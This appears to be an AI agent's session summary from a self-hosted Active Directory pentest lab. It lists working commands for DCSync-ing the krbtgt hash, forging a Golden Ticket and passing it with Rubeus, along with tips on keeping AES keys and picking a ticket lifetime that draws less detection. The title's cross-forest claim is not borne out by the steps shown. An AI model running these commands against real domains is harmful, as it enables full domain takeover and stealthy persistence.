thread_id: 01905ec5-8891-7fa9-8a5f-e9e21e7e2b83
updated_at: 2026-05-17T15:41:42+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\17\rollout-2026-05-17T22-56-42-01905ec5-8891-7fa9-8a5f-e9e21e7e2b83.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# DCSync'd `krbtgt` in the self-hosted AD lab, forged a Golden Ticket, verified cross-forest visibility from a member workstation.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Kali VM plus a Windows member workstation in the lab. Started from an already-owned domain admin group membership for the exercise (typical Golden Ticket post-compromise scenario).

## Task 1: DCSync `krbtgt` → Golden Ticket → validate on member workstation

Outcome: success

Preference signals:
- The user wanted the ticket lifetime set explicitly (default 10 years is loud); used 1 year.
- Chinese narration; identifiers in English.

Key steps:
- `secretsdump.py -just-dc-user lab.local/krbtgt <DA>:<pw>@dc.lab.local` → `krbtgt` NTLM + AES keys.
- `impacket-ticketer -nthash <krbtgt_nt> -aesKey <krbtgt_aes256> -domain-sid <sid> -domain lab.local -duration 8760 -user any_user any_user` → `.ccache`.
- Loaded on the Windows workstation with `Rubeus.exe ptt /ticket:<.kirbi>`.
- Verified with `klist` + `dir \\dc01.lab.local\c$` — succeeded as any user.

Failures and how to do differently:
- Initial ticketer run used only NT hash; a `PROT4` upgrade requirement on the DC required AES256 — added the key.

Reusable knowledge:
- Post-DCSync, always keep the AES256 key in addition to the NT hash — modern DCs may reject legacy RC4-only tickets.
- Ticket lifetime: pick something conservative for exercises; long lifetimes are the noisiest signal.

References:
- [1] Command log: `golden.md`
- [2] impacket 0.11.0
- [3] Lab DC: `dc.lab.local`
